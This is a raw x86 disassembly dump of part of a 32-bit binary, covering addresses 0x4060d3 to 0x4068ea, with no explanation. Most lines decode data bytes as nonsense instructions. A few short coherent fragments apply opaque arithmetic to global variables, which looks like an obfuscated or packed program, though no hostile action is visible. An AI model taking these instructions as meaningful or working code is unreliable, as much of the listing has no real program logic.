  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xc3726d96
  4060dc:	data16 gs ds jo 0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406109
  4060e6:	loop   0x4060b4
  4060e8:	icebp  
  4060e9:	aas    
  4060ea:	cmc    
  4060eb:	inc    ecx
  4060ec:	or     DWORD PTR [ecx+0x7ff9fdf2],edi
  4060f2:	cwde   
  4060f3:	mul    DWORD PTR [ebx+0x7a]
  4060f6:	dec    edi
  4060f7:	test   BYTE PTR [ebp+0x4d206982],ah
  4060fd:	call   DWORD PTR [esi+0x45]
  406100:	clc    
  406101:	enter  0xf5d8,0x26
  406105:	iret   
  406106:	(bad)  
  406107:	js     0x40615a
  406109:	leave  
  40610a:	fiadd  WORD PTR [ebx+0x1f]
  40610d:	retf   0x2dc1
  406110:	inc    edi
  406111:	arpl   WORD PTR [esi-0x12],ax
  406114:	cli    
  406115:	es mov bh,0x2
  406118:	out    dx,eax
  406119:	scas   al,BYTE PTR es:[edi]
  40611a:	add    DWORD PTR [ecx],edx
  40611c:	outs   dx,DWORD PTR ds:[esi]
  40611d:	cmp    edi,DWORD PTR [ebx-0x42]
  406120:	ds jp  0x4060ce
  406123:	mov    al,ds:0xdf1c4ed4
  406128:	or     esp,ecx
  40612a:	scas   al,BYTE PTR es:[edi]
  40612b:	mov    gs,WORD PTR [ebx-0x367d321]
  406131:	push   ds
  406132:	add    DWORD PTR [esi],edi
  406134:	(bad)  
  406136:	dec    BYTE PTR [edi+ecx*2-0x34]
  40613a:	xor    ebx,DWORD PTR [edi]
  40613c:	iret   
  40613d:	adc    al,0x6f
  40613f:	outs   dx,DWORD PTR ds:[esi]
  406140:	bound  ecx,QWORD PTR [eax+0x3bbbf48b]
  406146:	out    0xce,eax
  406148:	mov    edx,0x60d74e0
  40614d:	sub    DWORD PTR [esi+0x14],0x3612adf8
  406154:	cdq    
  406155:	adc    esi,DWORD PTR [eax]
  406157:	sbb    DWORD PTR [edx+0x58d59f9],eax
  40615d:	xor    ah,ch
  40615f:	fwait
  406160:	adc    BYTE PTR [ebx],dl
  406162:	push   0xe1f2e73b
  406167:	fldenv [eax-0x4c]
  40616a:	cmp    eax,0x4bfe173f
  40616f:	pop    ecx
  406170:	daa    
  406171:	pop    es
  406172:	imul   eax,esi,0xfffffffe
  406175:	test   eax,0xc865c525
  40617a:	and    DWORD PTR [esi],edi
  40617c:	xor    bl,BYTE PTR [ebp+0x3e]
  40617f:	adc    al,0x31
  406181:	and    BYTE PTR [edx-0x6c],ch
  406184:	pop    es
  406185:	call   0xcf3092a4
  40618a:	mov    ss,WORD PTR [eax+eax*8+0x56]
  40618e:	fsubr  st(6),st
  406190:	ins    BYTE PTR es:[edi],dx
  406191:	add    eax,0x93264dc1
  406196:	aaa    
  406197:	fwait
  406198:	xlat   BYTE PTR ds:[ebx]
  406199:	sti    
  40619a:	ins    DWORD PTR es:[edi],dx
  40619b:	push   ecx
  40619c:	pop    ecx
  40619d:	or     bh,BYTE PTR [ecx]
  40619f:	or     eax,0xa19ebede
  4061a4:	jo     0x406214
  4061a6:	daa    
  4061a7:	or     eax,0x9e50b5ec
  4061ac:	ret    
  4061ad:	sub    bh,BYTE PTR ds:0x42bb5859
  4061b3:	xor    eax,0x31a08286
  4061b8:	arpl   WORD PTR [eax],ax
  4061ba:	outs   dx,BYTE PTR ds:[esi]
  4061bb:	iret   
  4061bc:	adc    BYTE PTR [edx+eiz*2+0x6267b6af],0x31
  4061c4:	dec    ebx
  4061c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c6:	pop    ecx
  4061c7:	mov    ah,0x1c
  4061c9:	adc    DWORD PTR [edx+0x21],esi
  4061cc:	std    
  4061cd:	hlt    
  4061ce:	jmp    0x3d88b633
  4061d3:	pop    esp
  4061d4:	sub    al,0x5c
  4061d6:	in     eax,0x2b
  4061d8:	mov    ds:0x86642038,eax
  4061dd:	push   esi
  4061de:	sbb    BYTE PTR [esi-0x28],ah
  4061e1:	jno    0x4061ad
  4061e3:	arpl   WORD PTR [ebx],ax
  4061e5:	test   eax,0xa5105f65
  4061ea:	test   ebp,0xc7d009c2
  4061f0:	jne    0x406202
  4061f2:	gs sbb ch,al
  4061f5:	mov    al,0xea
  4061f7:	scas   eax,DWORD PTR es:[edi]
  4061f8:	fadd   DWORD PTR [edx-0x5d517fb8]
  4061fe:	pop    edi
  4061ff:	adc    eax,0x310618b7
  406205:	dec    esi
  406206:	std    
  406207:	inc    esi
  406208:	xchg   ebp,eax
  406209:	mov    ch,0x95
  40620b:	in     al,0x5e
  40620d:	inc    esp
  40620e:	js     0x4061ba
  406210:	dec    esi
  406211:	cmp    DWORD PTR [ecx-0x60],ecx
  406214:	mov    edx,0x6efd424a
  406219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40621a:	push   di
  40621c:	inc    edx
  40621d:	retf   
  40621e:	mov    edi,0xe1bac56
  406223:	dec    esp
  406224:	pop    ss
  406225:	cmc    
  406226:	leave  
  406227:	fdiv   st(7),st
  406229:	jle    0x4061dd
  40622b:	xlat   BYTE PTR ds:[ebx]
  40622c:	mov    ebx,0x954271ea
  406231:	push   ecx
  406232:	out    dx,eax
  406233:	jae    0x4061e3
  406235:	scas   eax,DWORD PTR es:[edi]
  406236:	daa    
  406237:	aad    0xff
  406239:	cmp    eax,0x720421b3
  40623e:	cmp    al,0xd7
  406240:	mov    WORD PTR [esi],gs
  406242:	loope  0x4061c4
  406244:	(bad)  
  406245:	rep ins DWORD PTR es:[edi],dx
  406247:	cmp    eax,0xc7c0ebe6
  40624c:	aad    0x6b
  40624e:	sub    cl,ch
  406250:	leave  
  406251:	std    
  406252:	(bad)  
  406253:	repz lock cmp eax,DWORD PTR [edi-0x33e36eec]
  40625b:	sbb    dh,BYTE PTR [edi+0x4b]
  40625e:	ficom  WORD PTR ds:0xbfa2a825
  406264:	dec    ebp
  406265:	rcl    DWORD PTR [edx],1
  406267:	pushf  
  406268:	push   ds
  406269:	mov    ebx,0xce2f5d77
  40626e:	jae    0x40627c
  406270:	imul   ebx,ebp,0xffffff91
  406273:	loopne 0x40626b
  406275:	aad    0x4a
  406277:	mov    bh,0x59
  406279:	inc    bp
  40627b:	in     al,dx
  40627c:	clc    
  40627d:	scas   al,BYTE PTR es:[edi]
  40627e:	pop    eax
  40627f:	push   ds
  406280:	push   ebp
  406281:	push   ecx
  406282:	cmp    al,0xd
  406284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406285:	xor    DWORD PTR [esi+0x6076ef97],edi
  40628b:	inc    edi
  40628c:	nop
  40628d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fd09,0x42fd86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e6f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	fidiv  WORD PTR [ebp+0x3c8cbade]
  406334:	jo     0x4063a6
  406336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406337:	jg     0x4063a9
  406339:	jo     0x4063a6
  40633b:	xor    eax,0x16c7b15c
  406340:	outs   dx,DWORD PTR ds:[esi]
  406341:	(bad)  
  406342:	cmp    DWORD PTR [eax-0x66],esp
  406345:	cli    
  406346:	daa    
  406347:	into   
  406348:	xchg   ebp,eax
  406349:	sti    
  40634a:	pop    es
  40634b:	and    eax,0x8225499f
  406350:	lods   eax,DWORD PTR ds:[esi]
  406351:	mov    eax,ds:0x6b47008f
  406356:	xchg   ebp,eax
  406357:	mov    ds:0x146b8411,eax
  40635c:	xor    eax,0xc70cda5f
  406361:	aaa    
  406362:	xor    al,0x7e
  406364:	addr16 mov esp,0x4f7df57b
  40636a:	and    al,0xf2
  40636c:	mov    bh,BYTE PTR [esi+0x9bd8879]
  406372:	xchg   edx,eax
  406373:	(bad)  
  406374:	cdq    
  406375:	mov    BYTE PTR [edx],bh
  406377:	or     al,0x10
  406379:	imul   ecx,esi,0xffffffd4
  40637c:	cmp    eax,DWORD PTR [esi]
  40637e:	mov    bl,0xcc
  406380:	dec    BYTE PTR [edx+0x56]
  406383:	cmp    al,0xe3
  406385:	(bad)  
  406386:	adc    al,0xfa
  406388:	in     eax,0x9
  40638a:	cmp    eax,0x1604f740
  40638f:	push   DWORD PTR [ebx+0x1f]
  406392:	dec    ebx
  406393:	int    0xa9
  406395:	and    al,0xd8
  406397:	(bad)  
  406398:	rcr    BYTE PTR [ebp-0x3e],cl
  40639b:	imul   ebx,DWORD PTR [ecx-0x3f],0xfa501eaa
  4063a2:	ret    
  4063a3:	sbb    DWORD PTR [edi],0xffffff86
  4063a6:	pop    esp
  4063a7:	adc    eax,0x3290e337
  4063ac:	mov    eax,ds:0x82dab8b5
  4063b1:	jge    0x40640c
  4063b3:	arpl   WORD PTR [eax-0x19371ea3],dx
  4063b9:	sbb    DWORD PTR gs:[ebp+0x3f],eax
  4063bd:	dec    ebp
  4063be:	sar    BYTE PTR [esp+eax*1-0x1c693bf3],1
  4063c5:	daa    
  4063c6:	dec    ebp
  4063c7:	xor    al,0x11
  4063c9:	mov    DWORD PTR [ebx],ebp
  4063cb:	or     DWORD PTR [edi],esi
  4063cd:	push   esi
  4063ce:	fld    QWORD PTR [edi+0x62]
  4063d1:	jno    0x40640b
  4063d3:	jno    0x40635c
  4063d5:	add    eax,0x3a5d1be3
  4063da:	sbb    ebx,edx
  4063dc:	xchg   esp,eax
  4063dd:	mov    ecx,0xef71cf4c
  4063e2:	mov    eax,0x12695798
  4063e7:	xchg   edi,eax
  4063e8:	shr    DWORD PTR [ebx],0x9b
  4063eb:	in     eax,0xfa
  4063ed:	xchg   BYTE PTR [ecx+0xb],bl
  4063f0:	mov    dh,0xa2
  4063f2:	xlat   BYTE PTR ds:[ebx]
  4063f3:	inc    edi
  4063f4:	loop   0x406410
  4063f6:	gs dec edi
  4063f8:	pop    edi
  4063f9:	pop    es
  4063fa:	loopne 0x4063f9
  4063fc:	or     eax,0xe69b00fd
  406401:	jne    0x406439
  406403:	inc    edx
  406404:	mov    DWORD PTR [eax+esi*8],esi
  406407:	dec    eax
  406408:	sbb    al,0x44
  40640a:	pusha  
  40640b:	das    
  40640c:	push   edi
  40640d:	jg     0x4063d5
  40640f:	pop    es
  406410:	inc    edx
  406411:	mov    eax,0x9d3f2d87
  406416:	pop    ecx
  406417:	jne    0x406475
  406419:	popf   
  40641a:	jg     0x406456
  40641c:	sbb    ebx,DWORD PTR [edx-0x7e]
  40641f:	xchg   esp,eax
  406420:	push   esp
  406421:	xchg   esp,eax
  406422:	xor    al,0x33
  406424:	data16 fdivr QWORD PTR [esi-0x2e1f25b6]
  40642b:	aas    
  40642c:	cmovo  eax,DWORD PTR ds:0x38160e78
  406433:	mov    DWORD PTR [edi],eax
  406435:	xchg   ecx,eax
  406436:	retf   0xcda6
  406439:	ins    DWORD PTR es:[edi],dx
  40643a:	and    eax,DWORD PTR ds:0xa43b2f77
  406440:	data16 into 
  406442:	pop    ds
  406443:	sbb    eax,0x9d3bee67
  406448:	push   0xcd92d8f2
  40644d:	lahf   
  40644e:	jecxz  0x406414
  406450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406451:	xchg   ebx,eax
  406452:	add    al,0xea
  406454:	(bad)  
  406455:	out    dx,al
  406456:	xor    ecx,DWORD PTR [ecx]
  406458:	scas   al,BYTE PTR es:[edi]
  406459:	adc    ah,BYTE PTR [ecx-0x3d]
  40645c:	cwde   
  40645d:	out    0x2e,al
  40645f:	fwait
  406460:	pusha  
  406461:	cmp    DWORD PTR [esi+0x18],ebp
  406464:	fs dec ecx
  406466:	jmp    0x22dc:0x2929ca20
  40646d:	das    
  40646e:	mov    esp,0xe0613d44
  406473:	hlt    
  406474:	clc    
  406475:	adc    DWORD PTR [edi],0xffffffa7
  406478:	fisttp DWORD PTR ds:0x486ecc6f
  40647e:	popa   
  40647f:	and    ebx,ebp
  406481:	addr16 loope 0x406462
  406484:	fsubrp st(7),st
  406486:	inc    edi
  406487:	sub    al,dl
  406489:	pop    ebx
  40648a:	pop    ds
  40648b:	ins    DWORD PTR es:[edi],dx
  40648c:	mov    edx,0x63d1016d
  406491:	nop
  406492:	or     BYTE PTR [ecx+0x17231408],bl
  406498:	inc    edi
  406499:	aaa    
  40649a:	cmc    
  40649b:	sbb    edi,DWORD PTR [edx-0x55fdbbc5]
  4064a1:	dec    esp
  4064a2:	test   DWORD PTR [edx],ebp
  4064a4:	pop    esi
  4064a5:	loopne 0x406469
  4064a7:	neg    dl
  4064a9:	push   es
  4064aa:	or     DWORD PTR [edx-0x25],ecx
  4064ad:	xor    BYTE PTR [ecx+0x202869ea],bl
  4064b3:	xchg   edx,eax
  4064b4:	jg     0x4064e9
  4064b6:	(bad)  
  4064b7:	pop    eax
  4064b8:	pop    ebp
  4064b9:	mov    esi,0x6c92e5b5
  4064be:	pop    ebx
  4064bf:	aas    
  4064c0:	lock bound ebx,QWORD PTR [ecx+0x45bb47ae]
  4064c7:	stc    
  4064c8:	ret    
  4064c9:	int3   
  4064ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064cb:	fcmovnu st,st(1)
  4064cd:	retf   
  4064ce:	xor    BYTE PTR [ebx+edx*1-0x71],dh
  4064d2:	stos   BYTE PTR es:[edi],al
  4064d3:	retf   
  4064d4:	cmp    eax,DWORD PTR ds:0xbf4a53a3
  4064da:	jnp    0x406543
  4064dc:	stos   DWORD PTR es:[edi],eax
  4064dd:	mov    al,ds:0x54372d00
  4064e2:	rcr    DWORD PTR [esi-0x37],0xc2
  4064e6:	sbb    BYTE PTR [eax],al
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	mov    ds:0x339334fa,al
  40656b:	cmp    dh,BYTE PTR [eax+0x70]
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	adc    ebx,DWORD PTR [ecx+ebx*4+0x1697f48b]
  406579:	sbb    ah,BYTE PTR [edx]
  40657b:	out    dx,al
  40657c:	ror    DWORD PTR [esi+0x58a491ee],0x8c
  406583:	mov    ah,0xa6
  406585:	mov    eax,ds:0xda9e033d
  40658a:	inc    ebx
  40658b:	mov    esi,0x714b23d8
  406590:	jle    0x40655d
  406592:	add    DWORD PTR [eax-0x19],0xffffffd5
  406596:	cmp    eax,0xa9e0eab0
  40659b:	mov    ecx,edx
  40659d:	add    DWORD PTR [edi-0x54],eax
  4065a0:	jecxz  0x406544
  4065a2:	cmp    al,0xd6
  4065a4:	mov    esp,0x99d52265
  4065a9:	aam    0x2b
  4065ab:	pop    eax
  4065ac:	fidiv  WORD PTR [eax-0x37234c21]
  4065b2:	lods   al,BYTE PTR ds:[esi]
  4065b3:	(bad)  
  4065b4:	out    0x78,eax
  4065b6:	int3   
  4065b7:	adc    al,0x10
  4065b9:	(bad)  
  4065ba:	into   
  4065bb:	push   edx
  4065bc:	pop    edi
  4065bd:	ror    BYTE PTR [ebp-0x43f88eb5],0x57
  4065c4:	addr16 xor eax,ebp
  4065c7:	xor    DWORD PTR [edi+0x43c017e0],edi
  4065cd:	cmp    BYTE PTR [edx],bh
  4065cf:	sub    ebx,DWORD PTR [esi]
  4065d1:	int    0xea
  4065d3:	fild   QWORD PTR [ecx+0x18]
  4065d6:	pop    ecx
  4065d7:	inc    esp
  4065d8:	push   es
  4065d9:	mov    bh,BYTE PTR fs:[esi]
  4065dc:	inc    ebx
  4065dd:	jnp    0x406652
  4065df:	gs loopne 0x406576
  4065e2:	repnz stc 
  4065e4:	rcr    BYTE PTR [esi],1
  4065e6:	cmp    esp,DWORD PTR [ebx]
  4065e8:	js     0x406604
  4065ea:	xchg   ecx,eax
  4065eb:	push   eax
  4065ec:	enter  0x388d,0x31
  4065f0:	jnp    0x4065ff
  4065f2:	ss pusha 
  4065f4:	cld    
  4065f5:	int    0x52
  4065f7:	pop    eax
  4065f8:	mov    bl,0xba
  4065fa:	cmp    esp,DWORD PTR [edx-0x8]
  4065fd:	add    DWORD PTR [edi+0x1c5adcd7],edx
  406603:	fiadd  DWORD PTR fs:[eax-0x15]
  406607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406608:	xor    cl,dh
  40660a:	push   ss
  40660b:	xchg   esp,eax
  40660c:	lock cmp DWORD PTR [ecx-0x435ba825],0x51d24bcc
  406617:	out    0x9c,al
  406619:	jbe    0x40668b
  40661b:	adc    al,0xfb
  40661d:	or     ecx,eax
  40661f:	cmc    
  406620:	std    
  406621:	frstor [edi+0x6a]
  406624:	test   BYTE PTR [ebx+esi*8+0x3a9a1c3],cl
  40662b:	mov    ah,0x13
  40662d:	mov    esp,0xdc06ea6e
  406632:	and    ch,dl
  406634:	and    al,0xb1
  406636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406637:	(bad)
  40663a:	push   0xd6058764
  40663f:	sub    al,0x29
  406641:	out    dx,eax
  406642:	xor    BYTE PTR [edi],bh
  406644:	adc    edi,edx
  406646:	push   cs
  406647:	fisub  DWORD PTR [ebx+0x150cc960]
  40664d:	jmp    0x9037:0x47b30cfd
  406654:	dec    ecx
  406655:	mov    al,ds:0xb9075581
  40665a:	gs push edi
  40665c:	inc    edi
  40665d:	mov    edi,0x71d7ba3e
  406662:	xchg   esi,ecx
  406664:	sub    eax,0x379d9a06
  406669:	xabort 0x7f
  40666c:	inc    ebp
  40666d:	jmp    0x40667b
  40666f:	cmp    edi,0x42f4b8c9
  406675:	sahf   
  406676:	xor    eax,0x507731db
  40667b:	mov    bh,0x3b
  40667d:	daa    
  40667e:	nop
  40667f:	mov    DWORD PTR [ecx-0x39e23483],ecx
  406685:	mov    bl,0x4d
  406687:	jne    0x4066ec
  406689:	pop    ebp
  40668a:	js     0x406613
  40668c:	or     eax,DWORD PTR [eax+0x2a]
  40668f:	jb     0x406676
  406691:	mov    ah,0xc9
  406693:	out    dx,eax
  406694:	and    DWORD PTR [eax],0xc06f0ab6
  40669a:	pushf  
  40669b:	test   al,0x8f
  40669d:	shl    BYTE PTR [edx-0x34],cl
  4066a0:	mov    dh,0x2d
  4066a2:	xor    BYTE PTR [ecx],bl
  4066a4:	into   
  4066a5:	cmp    ecx,eax
  4066a7:	xor    BYTE PTR ds:[edi],bh
  4066aa:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4066ac:	jns    0x40669f
  4066ae:	dec    BYTE PTR [ebp+0x73]
  4066b1:	or     eax,0x2af72906
  4066b6:	add    DWORD PTR [ecx+0xe],0xa24d0f81
  4066bd:	xor    DWORD PTR [edx+0x296caa1b],esp
  4066c3:	mov    edx,0x19e18336
  4066c8:	mov    bh,0xb8
  4066ca:	dec    ebx
  4066cb:	xchg   BYTE PTR [esi],al
  4066cd:	popf   
  4066ce:	push   eax
  4066cf:	retf   
  4066d0:	call   0xf272949d
  4066d5:	mov    ds:0xe31b9f73,eax
  4066da:	push   0xefc7ab6d
  4066df:	push   0x71
  4066e1:	repnz dec ebp
  4066e3:	psubsb mm2,QWORD PTR ds:0xbab72b68
  4066ea:	dec    eax
  4066eb:	cmp    ebx,ecx
  4066ed:	add    DWORD PTR [ebx-0x6ec19036],ebx
  4066f3:	adc    esp,DWORD PTR es:[edi]
  4066f6:	aam    0x9f
  4066f8:	je     0x40671f
  4066fa:	mov    ecx,0xb140c245
  4066ff:	dec    DWORD PTR [edi+0x12]
  406702:	adc    bh,dh
  406704:	push   0xaf00f9f7
  406709:	or     DWORD PTR [ecx],ecx
  40670b:	sbb    BYTE PTR [eax],dl
  40670d:	pusha  
  40670e:	loop   0x406787
  406710:	icebp  
  406711:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  406713:	inc    esi
  406714:	lock in eax,0xa7
  406717:	outs   dx,BYTE PTR ds:[esi]
  406718:	call   0x2673:0x1b7e0d6a
  40671f:	xchg   ecx,eax
  406720:	stos   DWORD PTR es:[edi],eax
  406721:	(bad)  
  406722:	ror    BYTE PTR [ecx+0xb],cl
  406725:	xlat   BYTE PTR ds:[ebx]
  406726:	hlt    
  406727:	loopne 0x40673f
  406729:	stc    
  40672a:	enter  0xf5d8,0x7
  40672e:	icebp  
  40672f:	lea    esp,[ecx-0x6b]
  406732:	pushf  
  406733:	add    edx,DWORD PTR [ebp+0x4b1585da]
  406739:	jg     0x4067a4
  40673b:	sbb    eax,0x274d0ca3
  406740:	pop    dx
  406742:	and    DWORD PTR [eax+edi*8-0x7c],edx
  406746:	pop    esi
  406747:	mov    ds,esp
  406749:	add    edx,ebp
  40674b:	or     al,0xb9
  40674d:	mov    ebx,0xe955f1e9
  406752:	les    eax,FWORD PTR [ebp-0x3b3f3109]
  406758:	push   0xffffff85
  40675a:	or     eax,0x4675b4ce
  40675f:	and    bh,bh
  406761:	stos   BYTE PTR es:[edi],al
  406762:	sti    
  406763:	mov    cl,0x63
  406765:	lock (bad) 
  406767:	mov    cl,0xe1
  406769:	ja     0x1e907130
  40676f:	fbld   TBYTE PTR [esp+eax*2-0xd63afc6]
  406776:	test   eax,0x3a5be812
  40677b:	push   esp
  40677c:	pop    esi
  40677d:	xchg   edx,eax
  40677e:	dec    ebx
  40677f:	es jnp 0x406795
  406782:	cwde   
  406783:	and    esp,DWORD PTR [eax]
  406785:	xor    BYTE PTR [edx+0xd],0x21
  406789:	xor    ch,dh
  40678b:	div    DWORD PTR [esi+0x8]
  40678e:	dec    edi
  40678f:	test   DWORD PTR [edi+0x48907484],esp
  406795:	out    dx,al
  406796:	pop    edi
  406797:	dec    edx
  406798:	jae    0x4067df
  40679a:	rcr    esp,1
  40679c:	push   cs
  40679d:	and    DWORD PTR [eax-0x2b],ecx
  4067a0:	adc    BYTE PTR [eax+esi*8+0x6c709019],ch
  4067a7:	cdq    
  4067a8:	xor    esp,DWORD PTR [eax+0x591f6420]
  4067ae:	call   FWORD PTR [ebp+0x43451e08]
  4067b4:	sar    BYTE PTR [ecx+0x7a],0x39
  4067b8:	inc    esp
  4067b9:	ficomp WORD PTR [esi]
  4067bb:	ins    DWORD PTR es:[edi],dx
  4067bc:	cmp    eax,0x65528b37
  4067c1:	loopne 0x40683c
  4067c3:	enter  0x6d14,0xbc
  4067c7:	nop
  4067c8:	lods   eax,DWORD PTR ds:[esi]
  4067c9:	and    al,0x6
  4067cb:	xor    eax,0xe5052c0c
  4067d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067d1:	rol    DWORD PTR [ebx+0x3a],1
  4067d4:	dec    ebp
  4067d5:	xchg   dx,ax
  4067d7:	nop
  4067d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067d9:	pop    es
  4067da:	(bad)  
  4067db:	dec    edx
  4067dc:	sub    eax,0x8bc9c24c
  4067e1:	push   ebp
  4067e2:	adc    BYTE PTR [ecx-0x3dccf7be],cl
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	test   DWORD PTR [edi],ebp
  406848:	aad    0xc3
  40684a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	into   
  406853:	ins    DWORD PTR es:[edi],dx
  406854:	ins    BYTE PTR es:[edi],dx
  406855:	out    dx,eax
  406856:	inc    edi
  406857:	scas   al,BYTE PTR es:[di]
  406859:	sbb    DWORD PTR [esi+0x18ba5e5],0x1
  406860:	scas   eax,DWORD PTR es:[edi]
  406861:	mov    edx,0xdcea1573
  406866:	sub    eax,0x3b917d60
  40686b:	sub    ecx,DWORD PTR [ebx]
  40686d:	(bad)  
  40686f:	into   
  406870:	hlt    
  406871:	test   BYTE PTR ds:0x69267727,bh
  406877:	pop    esi
  406878:	and    bh,al
  40687a:	cs and al,0xcb
  40687d:	ret    0xda4d
  406880:	sbb    DWORD PTR ds:0xef0b09d8,esp
  406886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406887:	adc    ebp,ebp
  406889:	push   cs
  40688a:	cmp    BYTE PTR fs:[eax+0x3bf410fb],bh
  406891:	ffreep st(7)
  406893:	pop    eax
  406894:	xor    BYTE PTR [ebx],bl
  406896:	cld    
  406897:	jb     0x4068cc
  406899:	cmp    DWORD PTR [edi],edx
  40689b:	into   
  40689c:	test   eax,0xd5b6dd04
  4068a1:	xchg   ebx,eax
  4068a3:	inc    eax
  4068a4:	retf   0xe25a
  4068a7:	ret    0xc188
  4068aa:	jg     0x4068d4
  4068ac:	jmp    0x5d6ed622
  4068b1:	add    al,0x48
  4068b3:	ins    BYTE PTR es:[edi],dx
  4068b4:	adc    eax,0x8cd1fdc3
  4068b9:	pop    ss
  4068ba:	imul   edi,DWORD PTR [ecx],0x229135e9
  4068c0:	imul   ecx,DWORD PTR [eax-0xa],0x48
  4068c4:	cmp    BYTE PTR [ebx],ch
  4068c6:	in     al,dx
  4068c7:	xchg   ebx,eax
  4068c8:	jecxz  0x4068e1
  4068ca:	xchg   DWORD PTR [esi+0x12],esi
  4068cd:	and    esp,eax
  4068cf:	add    BYTE PTR [eax],ah
  4068d1:	mov    al,0xcc
  4068d3:	sbb    eax,0x24292cdd
  4068d8:	(bad)  
  4068d9:	jle    0x40690f
  4068db:	xlat   BYTE PTR ds:[bx]
  4068dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068de:	inc    esp
  4068df:	je     0x406905
  4068e1:	(bad)  [ebp-0x56]
  4068e4:	and    ebp,DWORD PTR [ecx-0x2c3e6f17]
  4068ea:	pushf  
